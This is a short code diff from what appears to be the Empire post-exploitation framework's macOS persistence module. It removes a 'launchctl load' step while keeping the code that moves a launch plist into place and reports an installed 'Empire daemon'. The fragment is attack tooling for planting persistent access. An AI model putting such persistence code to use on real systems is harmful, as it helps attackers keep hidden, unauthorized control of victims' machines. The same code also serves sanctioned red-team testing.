@@ -152,9 +152,6 @@ process.communicate()
 process = subprocess.Popen('mv /tmp/%(plistFilename)s '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('launchctl load '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
 print "\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s"
 print "\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s"
 
